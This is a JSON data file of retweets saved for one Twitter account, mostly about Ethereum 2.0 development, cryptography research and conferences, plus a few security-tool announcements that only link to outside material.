@@ -1,0 +1,3308 @@
+{
+    "is_complete": true,
+    "username": "_chrisnatoli",
+    "retweeted": {
+        "1125393338964643840": {
+            "id": "1125393338964643840",
+            "text": "PS. I have a newsletter about the new dapps I discover across Ethereum, Tron and Eos every week.\n\nI created it with the aim of building a weekly habit that would keep me close to the innovations on the application layer. (https://dapp.substack.com\u00a0) \n\nCheers :)",
+            "username": "pet3rpan_",
+            "num_likes": 22,
+            "num_retweets": 2,
+            "num_replies": 2
+        },
+        "1123021519553064960": {
+            "id": "1123021519553064960",
+            "text": "Atomic Crosschain Transactions for Ethereum Private Sidechains paper has been released.\nhttps://arxiv.org/abs/1904.12079\u00a0",
+            "username": "drinkcoffee2010",
+            "num_likes": 10,
+            "num_retweets": 6,
+            "num_replies": 1
+        },
+        "1124032902843518979": {
+            "id": "1124032902843518979",
+            "text": "Are you interested in seeing what will be presented at #SP19? 1-minute-long video previews for the papers are now available on YouTube:https://www.youtube.com/playlist?list=PL0pRF4xvoD0ltWFKgp8KkpSgZYjB0bB27\u00a0\u2026",
+            "username": "IEEESSP",
+            "num_likes": 56,
+            "num_retweets": 32,
+            "num_replies": 1
+        },
+        "1123806204696891393": {
+            "id": "1123806204696891393",
+            "text": "The latest #lighthouse update is out!\n\nAchievements:\n- Re-licensed to Apache 2.0\n- Passing state-transition tests.\n- 25x faster merkle-roots.\n- Assisting with BLS standardization.\n\nUpcoming:\n- Spec v0.6.x\n- Discv5\n- Progress towards multi-client testnet.https://lighthouse.sigmaprime.io/update-10.html\u00a0",
+            "username": "sigp_io",
+            "num_likes": 80,
+            "num_retweets": 36,
+            "num_replies": 4
+        },
+        "1123406615573458944": {
+            "id": "1123406615573458944",
+            "text": "We're proud to be collaborating with @drakefjustin, @ChiaNetworkInc, @Algorand to produce a cross-chain BLS signature standard. We've been implementing experimental hashing algos in @rustlang, providing feedback to researchers.https://github.com/pairingwg/bls_standard/blob/master/minutes/spec-v1.md\u00a0\u2026",
+            "username": "sigp_io",
+            "num_likes": 43,
+            "num_retweets": 8,
+            "num_replies": 1
+        },
+        "1122197627754254336": {
+            "id": "1122197627754254336",
+            "text": "A new Avalanche paper by Jessie, James and Meowth^w^w^w^w @el33th4xor and @kevinsekniqi.\n\n\"Scalable and Probabilistic Leaderless BFT\nConsensus through Metastability\"\n\nhttps://avalabs.org/QmT1ry38PAmnhparPUmsUNHDEGHQusBLD6T5XJh4mUUn3v.pdf\u00a0\u2026",
+            "username": "AlexSkidanov",
+            "num_likes": 33,
+            "num_retweets": 7,
+            "num_replies": 1
+        },
+        "1121001617111695360": {
+            "id": "1121001617111695360",
+            "text": "Filecoin and Ethereum 2.0 collaborate on various fronts\u2014libp2p, VDFs, BLS12-381, secret single-leader election. Yay for win-win cross-blockchain efforts!https://filecoin.io/blog/collaboration-on-vdfs\u00a0\u2026",
+            "username": "drakefjustin",
+            "num_likes": 330,
+            "num_retweets": 92,
+            "num_replies": 12
+        },
+        "1121143693166043138": {
+            "id": "1121143693166043138",
+            "text": "v0.6.0 \u2014 Spring Cleaning \u2014 released!\nhttps://github.com/ethereum/eth2.0-specs/releases/tag/v0.6.0\u00a0\u2026\n\nThank you to all the spec contributors and client teams for the incredible work!",
+            "username": "dannyryan",
+            "num_likes": 255,
+            "num_retweets": 98,
+            "num_replies": 13
+        },
+        "1120603691092971521": {
+            "id": "1120603691092971521",
+            "text": "I need this in my life: a terminal user-interface for tshark https://termshark.io/\u00a0pic.twitter.com/siG3ANFo0w",
+            "username": "x0rz",
+            "num_likes": 1835,
+            "num_retweets": 598,
+            "num_replies": 23
+        },
+        "1120502923136520192": {
+            "id": "1120502923136520192",
+            "text": "Full Self-Driving videohttps://m.youtube.com/watch?feature=youtu.be&v=tlThdr3O5Qo\u00a0\u2026",
+            "username": "elonmusk",
+            "num_likes": 25165,
+            "num_retweets": 3811,
+            "num_replies": 1006
+        },
+        "1119774948942200833": {
+            "id": "1119774948942200833",
+            "text": "'Sup, Internet? I was in the mood for some RF RE, so here's a warm batch of keystroke injection PoCs in wireless presentation clickers.https://github.com/marcnewlin/presentation-clickers/blob/master/readme.md\u00a0\u2026",
+            "username": "marcnewlin",
+            "num_likes": 222,
+            "num_retweets": 92,
+            "num_replies": 6
+        },
+        "1120283398478733312": {
+            "id": "1120283398478733312",
+            "text": "Student authors should not be abused by reviewers. Whoever wrote \"The end result is that this is not science, but a totally unfounded thought experiment.\" when rejecting my CCS submission needs to rethink their choice to be in academia.",
+            "username": "willenck",
+            "num_likes": 274,
+            "num_retweets": 36,
+            "num_replies": 27
+        },
+        "1118865192480329728": {
+            "id": "1118865192480329728",
+            "text": "Today I gave a presentation at the @ethereum core devs meeting in Berlin about Sustainably Funding ETH 1.x/2.0 & why it\u2019s a pandoras box. \n\nThread Below  Take cover, because its Knowledge Bombs all the way down! /1pic.twitter.com/zgPLVTfSEA",
+            "username": "owocki",
+            "num_likes": 113,
+            "num_retweets": 24,
+            "num_replies": 7
+        },
+        "1118707626219413505": {
+            "id": "1118707626219413505",
+            "text": "My first medium article! Introducing you the project we're bringing to the Ethereum ecosystem and soon, to the world! I'd love if everyone could take a quick 3 minute read on the beginning of our journey down the crypto rabbit hole @heyaliceapp @danieltbarhttps://link.medium.com/YfUD6jKAYV\u00a0",
+            "username": "markpereir",
+            "num_likes": 77,
+            "num_retweets": 17,
+            "num_replies": 7
+        },
+        "1116502523861331968": {
+            "id": "1116502523861331968",
+            "text": "My presentation on \"Formal verification and CBC Casper\" at EDCON Sydney @Linktimetech https://docs.google.com/presentation/d/1PYvurhLAnv9KJTOWfAvW0jyPzefx7fMnapiWx1ToHr0\u00a0\u2026\n#EDCON #EDCON2019",
+            "username": "veryNR",
+            "num_likes": 58,
+            "num_retweets": 15,
+            "num_replies": 1
+        },
+        "1116488540928524290": {
+            "id": "1116488540928524290",
+            "text": "Thanks to Rory McNamara  ( https://blog.rorym.cnamara.com/\u00a0 ) _and a big SQLITE3 lib update_, #mimikatz can now open Chrome saved passwords & cookies databases already opened by Chrome (without making a copy of them somewhere..)\n\nBe efficient and use it as is!\n\n> https://github.com/gentilkiwi/mimikatz/releases\u00a0\u2026pic.twitter.com/EP9vpF0UbJ",
+            "username": "gentilkiwi",
+            "num_likes": 402,
+            "num_retweets": 208,
+            "num_replies": 4
+        },
+        "1116019079205335040": {
+            "id": "1116019079205335040",
+            "text": "What cryptography do top ~20 cryptocurrencies use? I've finally published my small research project: https://www.susanka.eu/coins-crypto/\u00a0",
+            "username": "tsusanka",
+            "num_likes": 43,
+            "num_retweets": 10,
+            "num_replies": 5
+        },
+        "1114168824599842817": {
+            "id": "1114168824599842817",
+            "text": "\u201c\u2026drivers in this dataset use Autopilot for 34.8% of their driven miles, and yet appear to maintain a relatively high degree of functional vigilance.\u201dhttps://twitter.com/lexfridman/status/1113870913546670080\u00a0\u2026",
+            "username": "elonmusk",
+            "num_likes": 12652,
+            "num_retweets": 1255,
+            "num_replies": 369
+        },
+        "1113048741966155777": {
+            "id": "1113048741966155777",
+            "text": "TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory https://www.reddit.com/r/redteamsec/comments/b8i9ly/tr19_im_in_your_cloud_reading_everyones_emails/\u00a0\u2026 #redteamsec",
+            "username": "r_redteamsec",
+            "num_likes": 136,
+            "num_retweets": 58,
+            "num_replies": 0
+        },
+        "1113459974355660806": {
+            "id": "1113459974355660806",
+            "text": "Tweetstorm about #eth2 development\n\n\"The ETH 2.0 testing saga\"\n\nIn context of some of my traveling\n    \n#ethereum #serenity\n\nRead\n",
+            "username": "protolambda",
+            "num_likes": 153,
+            "num_retweets": 46,
+            "num_replies": 5
+        },
+        "1112853101969498112": {
+            "id": "1112853101969498112",
+            "text": "Checkout the latest #Lighthouse development update! \n\nhttps://lighthouse.sigmaprime.io/update-09.html\u00a0\n\nOur rusty beacon node and multi-threaded validator client can now produce a functional, short-lived, single-client testnet!\n\n#Ethereum #Serenity",
+            "username": "sigp_io",
+            "num_likes": 87,
+            "num_retweets": 35,
+            "num_replies": 3
+        },
+        "1112846587133231104": {
+            "id": "1112846587133231104",
+            "text": "Latest #Lighthouse development update is out!\n\nhttps://lighthouse.sigmaprime.io/update-09.html\u00a0\n\nKudos to @paulhauner, @agemanning and the rest of the @sigp_io crew for all the hard work. Our beacon node is alive! \n\n#Ethereum #Serenity",
+            "username": "ethZed",
+            "num_likes": 29,
+            "num_retweets": 6,
+            "num_replies": 1
+        },
+        "1112627069169491969": {
+            "id": "1112627069169491969",
+            "text": "\n#Ethereum #Serenityhttps://twitter.com/AgeManning/status/1112623979313795072\u00a0\u2026",
+            "username": "ethZed",
+            "num_likes": 4,
+            "num_retweets": 2,
+            "num_replies": 0
+        },
+        "1112623979313795072": {
+            "id": "1112623979313795072",
+            "text": "LIghthouse #Ethereum 2.0 beacon node!\nTop: #Lighthouse beacon node: #libp2p ready, simplified spec (8 validators - demonstrative)\nMiddle: Validator Client - Gets duties signs/publishes blocks/attestations\nBottom: Second node - Syncs and gossips via #libp2p to first node.pic.twitter.com/gdok9fym1h",
+            "username": "AgeManning",
+            "num_likes": 84,
+            "num_retweets": 18,
+            "num_replies": 2
+        },
+        "1112605017196756992": {
+            "id": "1112605017196756992",
+            "text": "8 #lighthouse nodes syncing with block and attestation production from our validator client. Networked with rust-libp2p gossipsub, via an AWS server!  #eth2 @sigp_io @AgeManning @sproulM_ @spble @ethZedpic.twitter.com/KRZq0hqbtN",
+            "username": "paulhauner",
+            "num_likes": 256,
+            "num_retweets": 59,
+            "num_replies": 25
+        },
+        "1106313018588065792": {
+            "id": "1106313018588065792",
+            "text": "eth2.0 spec v0.5.0 -- `exec beacon_chain`\nhttps://github.com/ethereum/eth2.0-specs/releases/tag/v0.5.0\u00a0\u2026\n\nThank you everyone who contributed!",
+            "username": "dannyryan",
+            "num_likes": 141,
+            "num_retweets": 44,
+            "num_replies": 0
+        },
+        "1103674726466183174": {
+            "id": "1103674726466183174",
+            "text": "Slides from my #EthCC talk about Lighthouse, @sigp_io's Eth2.0 implementation, are now online! Is it a coincidence that the fire alarm went off when I started talking about fuzzing ?\nhttps://github.com/sigp/presentations/blob/master/Sigma%20Prime%20-%20Lighthouse%20-%20EthCC.pdf\u00a0\u2026\n#Ethereum #Serenityhttps://twitter.com/protolambda/status/1103238798199136257\u00a0\u2026",
+            "username": "ethZed",
+            "num_likes": 9,
+            "num_retweets": 3,
+            "num_replies": 1
+        },
+        "1101422823816548353": {
+            "id": "1101422823816548353",
+            "text": "Catch my talk at #EthCC in Paris on Wednesday morning to hear all about lighthouse, the #Ethereum #Serenity Rust implementation we've been working on @sigp_io",
+            "username": "ethZed",
+            "num_likes": 17,
+            "num_retweets": 4,
+            "num_replies": 0
+        },
+        "1100601731208134656": {
+            "id": "1100601731208134656",
+            "text": "Latest #Lighthouse update is out! Lots of progress was made over the last fortnight #Ethereum #Serenityhttps://lighthouse.sigmaprime.io/update-08.html\u00a0",
+            "username": "ethZed",
+            "num_likes": 71,
+            "num_retweets": 22,
+            "num_replies": 4
+        },
+        "1098059929003278336": {
+            "id": "1098059929003278336",
+            "text": "We had @drakefjustin from @ethereum Foundation be a part of our 5th #WhiteboardSeries episode.  \n@AlexSkidanov spoke with Justin about Ethereum scaling, Sharding and more!  \n\nWatch it here \u2192 https://near.ai/12dfb\u00a0  [VIDEO]\n\n#FutureIsNEAR #Blockchain #TechTalk #Ethereumpic.twitter.com/uDfS5KgznG",
+            "username": "NEARProtocol",
+            "num_likes": 45,
+            "num_retweets": 15,
+            "num_replies": 0
+        },
+        "1093711795217289216": {
+            "id": "1093711795217289216",
+            "text": "Extremely proud of @AgeManning for being the main contributor to the smart contract security chapter of \u201cMastering Ethereum\u201c by @aantonop & @gavofyork ! if you haven\u2019t already, check out his reference post on our @sigp_io blog - https://blog.sigmaprime.io/solidity-security.html\u00a0\u2026pic.twitter.com/GvbPEbI11V",
+            "username": "ethZed",
+            "num_likes": 17,
+            "num_retweets": 4,
+            "num_replies": 0
+        },
+        "1090974895381598208": {
+            "id": "1090974895381598208",
+            "text": "Today marks the very first ETH2.0 version release. Congrats everyone! https://github.com/ethereum/eth2.0-specs/releases/tag/v0.1\u00a0\u2026",
+            "username": "terencechain",
+            "num_likes": 996,
+            "num_retweets": 296,
+            "num_replies": 37
+        },
+        "1090134218229788672": {
+            "id": "1090134218229788672",
+            "text": "Well done @AgeManning on implementing libp2p Gossipsub in Rust! @sigp_io team has made amazing progress on lighthouse lately! #Ethereum #Serenity #Eth2https://twitter.com/sigp_io/status/1090133542728654848\u00a0\u2026",
+            "username": "ethZed",
+            "num_likes": 14,
+            "num_retweets": 3,
+            "num_replies": 0
+        },
+        "1090134949615652865": {
+            "id": "1090134949615652865",
+            "text": "Exciting news for #lighthouse!\n\nGossipsub allows efficiently segregating the p2p network into topics. Each shard will have its own topic, avoiding a noisy global broadcast domain.https://twitter.com/sigp_io/status/1090133542728654848\u00a0\u2026",
+            "username": "paulhauner",
+            "num_likes": 45,
+            "num_retweets": 10,
+            "num_replies": 0
+        },
+        "1086286476474810369": {
+            "id": "1086286476474810369",
+            "text": "Seems we're going with block 7.28M for the #Ethereum Constantinople refork scheduled for the 27th of February! Will be a single fork on mainnet and a post-Constantinople-fixup fork on the testnets to get them back in line feature wise with the main network.",
+            "username": "peter_szilagyi",
+            "num_likes": 325,
+            "num_retweets": 120,
+            "num_replies": 21
+        },
+        "1085479850578571264": {
+            "id": "1085479850578571264",
+            "text": "Can\u2019t wait to have the #Ethereum community here down under! Check out this guide put together by @paulhauner and feel free to reach out if you have any questions about Sydney!https://twitter.com/paulhauner/status/1085455025550196737\u00a0\u2026",
+            "username": "ethZed",
+            "num_likes": 13,
+            "num_retweets": 1,
+            "num_replies": 1
+        },
+        "1084735350537211909": {
+            "id": "1084735350537211909",
+            "text": "Sorry Twitter , I've been quiet about #Lighthouse recently. Updates:\n\n- Notes + video from lighthouse call #0: https://bit.ly/2squTlN\u00a0\n- Text update (notes are better, IMO): https://bit.ly/2Fvs5LX\u00a0\n\nMost interestingly, we've started the validator client. Yay!  More... 1/10",
+            "username": "paulhauner",
+            "num_likes": 37,
+            "num_retweets": 14,
+            "num_replies": 1
+        },
+        "1082376237136441344": {
+            "id": "1082376237136441344",
+            "text": "Ethereum Classic experienced a 51% attack, with very large reorgs. There are also rumors of double spends. https://www.cryptonews24x7.net/is-ethereum-classic-etc-blockchain-under-51-attack-several-blocks-reportedly-go-under-reorg/\u00a0\u2026",
+            "username": "el33th4xor",
+            "num_likes": 164,
+            "num_retweets": 66,
+            "num_replies": 20
+        },
+        "1082394833031815169": {
+            "id": "1082394833031815169",
+            "text": "big move!https://twitter.com/github/status/1082345362503938049\u00a0\u2026",
+            "username": "terencechain",
+            "num_likes": 8,
+            "num_retweets": 1,
+            "num_replies": 3
+        },
+        "1082214445701578752": {
+            "id": "1082214445701578752",
+            "text": "#Ethereum mainnet Constantinople hardfork (16th of January) is fast approaching. Please make sure you are running Geth 1.8.20+ or Parity 2.1.10+/2.2.5+ to avoid unpleasant surprises!",
+            "username": "peter_szilagyi",
+            "num_likes": 232,
+            "num_retweets": 96,
+            "num_replies": 8
+        },
+        "1082046362936430592": {
+            "id": "1082046362936430592",
+            "text": "Great article from @IEEESpectrum on the environmental impact of the PoS transition in #Ethereum featuring @paulhaunerhttps://spectrum.ieee.org/computing/networks/ethereum-plans-to-cut-its-absurd-energy-consumption-by-99-percent\u00a0\u2026",
+            "username": "ethZed",
+            "num_likes": 12,
+            "num_retweets": 4,
+            "num_replies": 0
+        },
+        "1081956934251507712": {
+            "id": "1081956934251507712",
+            "text": "Eth2.0 Implementers Call 9 notes\nhttps://github.com/ethereum/eth2.0-pm/blob/master/eth2.0-implementers-calls/call_009.md\u00a0\u2026\n\nThanks Peter!",
+            "username": "dannyryan",
+            "num_likes": 50,
+            "num_retweets": 10,
+            "num_replies": 2
+        },
+        "1078428201104408576": {
+            "id": "1078428201104408576",
+            "text": "it took 1000s of years to get the amount of work to create light down to trivial amounts so everyone could use it\n\nit took just 10 years to fuck it up and need a few megawatts of servers to turn one bulb on from the couchpic.twitter.com/ikgelQR3Ls",
+            "username": "internetofshit",
+            "num_likes": 5284,
+            "num_retweets": 2256,
+            "num_replies": 62
+        },
+        "1078002587935244288": {
+            "id": "1078002587935244288",
+            "text": "Manuscript in preparation (2\u03360\u03361\u03368\u03362019)",
+            "username": "AcademicsSay",
+            "num_likes": 5201,
+            "num_retweets": 1128,
+            "num_replies": 39
+        },
+        "1076186494212071424": {
+            "id": "1076186494212071424",
+            "text": "OFFICIAL ANNOUNCEMENT! \n\nPlease LOCK April 8-14, 2019 on your CALENDAR for EDCON2019!!! \n\nHope to see you in Sydney, Australia!  \n\n#EDCON #EDCON2019 #EDCONSydney #Edconpic.twitter.com/qYP5YCWcpc",
+            "username": "Linktimetech",
+            "num_likes": 27,
+            "num_retweets": 19,
+            "num_replies": 1
+        },
+        "1076195034209415173": {
+            "id": "1076195034209415173",
+            "text": "Our team @GoogleAI has just released a new library for training machine learning models with (differential) privacy for training data! Very excited to share it with the research community and we look forward to your contributions! Check it out on GitHub: https://github.com/tensorflow/privacy\u00a0\u2026pic.twitter.com/EMsuQ1w7eQ",
+            "username": "NicolasPapernot",
+            "num_likes": 1344,
+            "num_retweets": 485,
+            "num_replies": 15
+        },
+        "1076171364166443008": {
+            "id": "1076171364166443008",
+            "text": "This is the Ulam Spiral. All the dots are prime numbers, placed on a square lattice of integers. Nobody knows why these patterns emerge.pic.twitter.com/qIPloo1tpV",
+            "username": "jinglanW",
+            "num_likes": 4868,
+            "num_retweets": 1516,
+            "num_replies": 131
+        },
+        "1075878931155304449": {
+            "id": "1075878931155304449",
+            "text": "Hey y'all check out part 1 out of 3 \"Introduction to Cryptography\" for the basics of public key crypto, with a dash of number theory and group theory. Written for those without a math background:https://medium.com/@jinglan/introduction-to-cryptography-part-1-646893e87d5d\u00a0\u2026",
+            "username": "jinglanW",
+            "num_likes": 91,
+            "num_retweets": 26,
+            "num_replies": 4
+        },
+        "1075497475891294208": {
+            "id": "1075497475891294208",
+            "text": "ETH2.0 implementer call #8 notes\nThanks Peter for putting everything together!https://github.com/ethereum/eth2.0-pm/blob/master/eth2.0-implementers-calls/call_008.md\u00a0\u2026",
+            "username": "terencechain",
+            "num_likes": 24,
+            "num_retweets": 6,
+            "num_replies": 0
+        },
+        "1075103627188961280": {
+            "id": "1075103627188961280",
+            "text": "A short paper by @VitalikButerin on Discouragement attacks:https://github.com/ethereum/research/blob/master/papers/discouragement/discouragement.pdf\u00a0\u2026",
+            "username": "AlexSkidanov",
+            "num_likes": 77,
+            "num_retweets": 20,
+            "num_replies": 2
+        },
+        "1074897674929823744": {
+            "id": "1074897674929823744",
+            "text": "We're going to start processing applications in the next couple of days, so now's a good time to apply if you've been considering it! https://twitter.com/paulhauner/status/1072023255882452992\u00a0\u2026",
+            "username": "paulhauner",
+            "num_likes": 12,
+            "num_retweets": 7,
+            "num_replies": 0
+        },
+        "1072595028961320960": {
+            "id": "1072595028961320960",
+            "text": "This report on @rv_inc's verification of RANDAO's possible randomness bias under worst-case adversarial conditions using statistical model checking is one of the most underrated new papers in cryptocurrency security/modeling, IMO.https://github.com/runtimeverification/rdao-smc/blob/master/report/rdao-analysis.pdf\u00a0\u2026",
+            "username": "phildaian",
+            "num_likes": 51,
+            "num_retweets": 13,
+            "num_replies": 2
+        },
+        "1071944600170881025": {
+            "id": "1071944600170881025",
+            "text": "The Australian #Blockchain ecosystem has been updated to be a strong 124 different organisations!! Immensely looking forward to seeing this #crypto space grow nationally and internationally in the coming years @bitfwdxyz\n\nLink to all the projects: https://medium.com/bitfwd/whats-happening-in-the-australian-blockchain-ecosystem-3553c028d134t\u00a0\u2026pic.twitter.com/WdIGKKJrhn",
+            "username": "tomterado",
+            "num_likes": 194,
+            "num_retweets": 64,
+            "num_replies": 25
+        },
+        "1072002685962833922": {
+            "id": "1072002685962833922",
+            "text": ".@sigp_io featured on CoinDesk for our work on #Ethereum Serenity -https://www.coindesk.com/next-gen-buidlers-the-8-teams-working-on-ethereum-2-0\u00a0\u2026",
+            "username": "ethZed",
+            "num_likes": 12,
+            "num_retweets": 5,
+            "num_replies": 1
+        },
+        "1070822815006318592": {
+            "id": "1070822815006318592",
+            "text": "My attempt at explaining CBC Casper:\n\nhttps://vitalik.ca/general/2018/12/05/cbc_casper.html\u00a0\u2026",
+            "username": "VitalikButerin",
+            "num_likes": 758,
+            "num_retweets": 217,
+            "num_replies": 82
+        },
+        "1071052095535628288": {
+            "id": "1071052095535628288",
+            "text": "#Ethereum Constantinople mainnet hard fork scheduled for block #7080000, estimated around the 16th of January, 2019!",
+            "username": "peter_szilagyi",
+            "num_likes": 918,
+            "num_retweets": 364,
+            "num_replies": 52
+        },
+        "1070428203829710848": {
+            "id": "1070428203829710848",
+            "text": "We published the first part of a two-part series on Blockchain Sharding. In this post you will learn why sharding is important, how it is built today and what challenges sharded protocols face.\n\nHuge props to @QuaintM and @zmanian for early feedback!https://medium.com/nearprotocol/the-authoritative-guide-to-blockchain-sharding-part-1-1b53ed31e060\u00a0\u2026",
+            "username": "AlexSkidanov",
+            "num_likes": 80,
+            "num_retweets": 30,
+            "num_replies": 1
+        },
+        "1070037364746149889": {
+            "id": "1070037364746149889",
+            "text": "Thrilled to announce TxProbe, the latest in Bitcoin p2p topology inference. https://arxiv.org/pdf/1812.00942.pdf\u00a0\u2026 The goal is to probe whether two reachable nodes are in fact connected directly to each other. Achieving this relies on several subtle insights about how transactions are relayed",
+            "username": "socrates1024",
+            "num_likes": 114,
+            "num_retweets": 43,
+            "num_replies": 3
+        },
+        "1069654333233475584": {
+            "id": "1069654333233475584",
+            "text": "Announcing the Cryptocurrency Implementers' Workshop at Financial Crypto '19 \nhttp://fc19.ifca.ai/ciw/\u00a0 An experimental workshop geared towards real world deployment, practical engineering efforts. \n    If you are interested in presenting a Demo, submit abstract & code by Dec 21.",
+            "username": "socrates1024",
+            "num_likes": 42,
+            "num_retweets": 20,
+            "num_replies": 1
+        },
+        "1050751703933509632": {
+            "id": "1050751703933509632",
+            "text": "Some thoughts about @VladZamfir \u2019s Blockchain Governance articles.\n-His main point is that governance is related with politics -> Bravo!\n-Then, politics affects entire society -> Yes!\n1/13",
+            "username": "PolTorrent",
+            "num_likes": 22,
+            "num_retweets": 6,
+            "num_replies": 1
+        },
+        "1069000662057451522": {
+            "id": "1069000662057451522",
+            "text": "life\n   \u25cb \n\u304f|)\u3078\n    \u3009                  fall writing \n \uffe3\uffe3\u2517\u2513            goals \n \u3000 \u3000   \u2517\u2513\u3000     \u30fe\u25cb\uff7c\n  \u3000\u3000        \u2517\u2513   \u30d8/ \u3000 \u3000 \n \u3000                  \u2517\u2513\u30ce \n\u3000 \u3000 \u3000 \u3000 \u3000    \u2517\u2513",
+            "username": "AcademicsSay",
+            "num_likes": 1841,
+            "num_retweets": 444,
+            "num_replies": 7
+        },
+        "1068809869178875904": {
+            "id": "1068809869178875904",
+            "text": "Excited for us to stay off the collective hype train for a while ",
+            "username": "VladZamfir",
+            "num_likes": 206,
+            "num_retweets": 14,
+            "num_replies": 15
+        },
+        "1067104922657849345": {
+            "id": "1067104922657849345",
+            "text": "this is the best fucking ad ive ever seenpic.twitter.com/ivz655zTVK",
+            "username": "cozieuwu",
+            "num_likes": 201393,
+            "num_retweets": 85158,
+            "num_replies": 1721
+        },
+        "1067963837926658048": {
+            "id": "1067963837926658048",
+            "text": "Ethereum 2.0 explained by @drakefjustin. Starting at 16:20https://youtu.be/Ni4fez_Zjh4\u00a0",
+            "username": "terencechain",
+            "num_likes": 6,
+            "num_retweets": 1,
+            "num_replies": 0
+        },
+        "1068094650169389056": {
+            "id": "1068094650169389056",
+            "text": "Posted here the complete list of #ewasm community calls so far with their appropriate Youtube links:https://github.com/ewasm/pm/#community-calls\u00a0\u2026",
+            "username": "alexberegszaszi",
+            "num_likes": 5,
+            "num_retweets": 1,
+            "num_replies": 0
+        },
+        "1067468706974961664": {
+            "id": "1067468706974961664",
+            "text": "NIST's chart of \"when do you need a blockchain?\"\n\nIMO it's overly pessimistic in some areas. For example, for auditing use cases, you should just publish Merkle roots of your data on-chain, ie. Plasma without the exit game.\n\nThis is also useful for privacy-demanding use cases.pic.twitter.com/DhKgGTscvf",
+            "username": "VitalikButerin",
+            "num_likes": 943,
+            "num_retweets": 335,
+            "num_replies": 55
+        },
+        "1067170316768632839": {
+            "id": "1067170316768632839",
+            "text": "Are you interested in\n\n- Rust \n- PoS systems\n- Being a core ETH 2.0 dev\n- Infosec and exploiting software\n\nWe're hiring in a bear market as we built our business on hard work and core services (and modesty, of course). \n\nSydney-based preferred. Apply: https://goo.gl/Z4tXDR\u00a0 ",
+            "username": "paulhauner",
+            "num_likes": 82,
+            "num_retweets": 25,
+            "num_replies": 3
+        },
+        "1067473971560542209": {
+            "id": "1067473971560542209",
+            "text": "I discuss Ethereum 2.0 and VDFs on the @epicenterbtc showhttps://www.youtube.com/watch?v=QDwaAnhSJk8\u00a0\u2026",
+            "username": "drakefjustin",
+            "num_likes": 63,
+            "num_retweets": 18,
+            "num_replies": 0
+        },
+        "1066641639534297088": {
+            "id": "1066641639534297088",
+            "text": "#1. Online #OSINT CheckList [Reconnaissance] -\n\n* Dnstrails\n* http://Viewdns.info\u00a0\n* Google ASE aka Google Dorking\n* Pentest-tools\n* Dnsdumpster\n* VirusTotal\n* http://Crt.sh\u00a0\n* Dnsgoodies\n\n#security #infosec #bugbounty #enumeration #pentest #redteam #cybersecurity",
+            "username": "payloadartist",
+            "num_likes": 607,
+            "num_retweets": 275,
+            "num_replies": 10
+        },
+        "1066506895353999360": {
+            "id": "1066506895353999360",
+            "text": "New lighthouse update! Quiet on the technology side, but news on the team side! @ralexstokes has joined as a regular contributor and we've posted an listing for a Rust dev! Check out the listing here: https://goo.gl/BTVVuN\u00a0\n\nThe blog post lives here:https://goo.gl/AesNc9\u00a0",
+            "username": "paulhauner",
+            "num_likes": 16,
+            "num_retweets": 5,
+            "num_replies": 0
+        },
+        "1065069988078383110": {
+            "id": "1065069988078383110",
+            "text": "Mastering Ethereum is now available on Kindle. Print in one week:\n\nMastering Ethereum: Building Smart Contracts and DAppshttps://www.amazon.com/dp/1491971940\u00a0",
+            "username": "aantonop",
+            "num_likes": 2065,
+            "num_retweets": 597,
+            "num_replies": 92
+        },
+        "1065319272619130881": {
+            "id": "1065319272619130881",
+            "text": "Here's an ELI5 for the exchange vulnerability I Tweeted about last night, discovered by @levelk_io.\n\nBasically, when an exchange processes a withdrawal to an Ethereum address, that address might be a smart contract. That smart contract might have a default function that uses gas.",
+            "username": "phildaian",
+            "num_likes": 139,
+            "num_retweets": 56,
+            "num_replies": 2
+        },
+        "1065282801266802688": {
+            "id": "1065282801266802688",
+            "text": "This blockchain governance podcast is ! Check it out!!https://twitter.com/zeroknowledgefm/status/1065281910211981318\u00a0\u2026",
+            "username": "VladZamfir",
+            "num_likes": 163,
+            "num_retweets": 33,
+            "num_replies": 8
+        },
+        "1064597323785953281": {
+            "id": "1064597323785953281",
+            "text": "Whatever your reason for being in crypto, now is the time for:\n\n- Compassion\n- Patience\n- Respect\n\nLot's of people have lost lots of money recently and it is not helpful to make empty promises, share shitty memes, or criticize others' choices. \n\n#bekindorshutup",
+            "username": "aantonop",
+            "num_likes": 6681,
+            "num_retweets": 1608,
+            "num_replies": 304
+        },
+        "1065058462348959744": {
+            "id": "1065058462348959744",
+            "text": "https://chrome.google.com/webstore/detail/block-service-workers/ceokjgeibfjfcboemhdpkdalankbmnej\u00a0\u2026 Chrome extension to allow or block individual Service Workers installed by web apps. Related to the #kiwicon talk I presented with @libNex",
+            "username": "claudiocontin",
+            "num_likes": 18,
+            "num_retweets": 13,
+            "num_replies": 1
+        },
+        "1063743184365334528": {
+            "id": "1063743184365334528",
+            "text": "There is a new search engine for Internet-connected devices including industrial components - \"FOFA pro\", an alternative to @shodanhq @censysio @zoomeye_team, thanks @mmrupp for sharing > https://www.fofa.so/subject\u00a0pic.twitter.com/8qaGsom0yE",
+            "username": "shipulin_anton",
+            "num_likes": 202,
+            "num_retweets": 106,
+            "num_replies": 8
+        },
+        "1062510054685855749": {
+            "id": "1062510054685855749",
+            "text": "Part 2 of my visual exploration of CBC Casper is out  I follow the latest paper by @VladZamfir @naterush1997 @adiasg, where they use the CBC framework to define protocols, including the friendly GHOST  Check it out and let me know what you think!https://medium.com/@barnabe/partially-explained-casper-cbc-specs-part-two-protocols-from-the-abstract-cf144fcdac02\u00a0\u2026",
+            "username": "barnabemonnot",
+            "num_likes": 45,
+            "num_retweets": 17,
+            "num_replies": 2
+        },
+        "1062435516103225345": {
+            "id": "1062435516103225345",
+            "text": "Finally! There's this super hot #Solidity 0.5.0 release: https://github.com/ethereum/solidity/releases/tag/v0.5.0\u00a0\u2026\n\nWe still need to push to npm.\n\nTime to hide from bug reports ",
+            "username": "alexberegszaszi",
+            "num_likes": 282,
+            "num_retweets": 98,
+            "num_replies": 11
+        },
+        "1062447122740666369": {
+            "id": "1062447122740666369",
+            "text": "Wanna help out in shaping the future of P2P networks, but you need a refresher in networking?\n\nHere\u2019s a great compilation of videos from CS144 @Stanford!\n\nhttps://ipfs.io/ipfs/Qme5WUth89YW4zBdiS37RBobnhm1ahkNeydnzxzVYgxSj5/cs144-videos.html\u00a0\u2026",
+            "username": "raulvk",
+            "num_likes": 24,
+            "num_retweets": 8,
+            "num_replies": 2
+        },
+        "1060998315167297536": {
+            "id": "1060998315167297536",
+            "text": "Check out my \u201cCasper CBC, Simplified\u201d blog post https://medium.com/@aditya.asgaonkar/casper-cbc-simplified-2370922f9aa6\u00a0\u2026",
+            "username": "adiasg",
